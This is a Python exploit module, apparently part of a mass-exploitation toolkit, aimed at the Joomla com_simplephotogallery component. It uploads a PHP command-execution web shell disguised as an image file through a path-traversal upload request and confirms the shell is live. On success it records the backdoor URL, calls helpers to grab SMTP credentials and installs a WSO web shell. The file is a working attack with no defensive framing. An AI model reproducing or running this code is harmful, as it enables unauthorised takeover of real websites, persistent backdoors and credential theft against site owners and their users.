# coding=utf-8
import requests
import printModule
import getSMTP
import wsoShellUploaderModule

payloadshell = '"neko!!<?php {});?>"'.format("system({}".format('$_GET["cmd"]'))
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}


def Exploit(site):
    try:
        PostData = {
            'jpath': '..%2F..%2F..%2F..%2Ftmp%2F'
        }
        fil = {'file': ('neko.php.xxxjpg', payloadshell, 'text/html')}
        requests.post('http://' + site + '/administrator/components/com_simplephotogallery/lib/uploadFile.php',
                      data=PostData, files=fil, timeout=10, headers=Headers)
        Exp = requests.get('http://' + site + '/tmp/neko.php.xxxjpg', timeout=10, headers=Headers)
        if 'neko!!' in str(Exp.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write(site + '/tmp/neko.php.xxxjpg?cmd=uname -a' + '\n')
            getSMTP.JooomlaSMTPshell(site + '/tmp/neko.php.xxxjpg?cmd=id')
            WSo = wsoShellUploaderModule.UploadWso(site + '/tmp/neko.php.xxxjpg?cmd=id')
            if WSo == 'No':
                pass
            else:
                with open('result/WSo_Shell.txt', 'a') as Wr:
                    Wr.write('{}\n'.format(WSo))
            return printModule.returnYes(site, 'N/A', 'Com_simplephotogallery', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_simplephotogallery', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_simplephotogallery', 'Joomla')
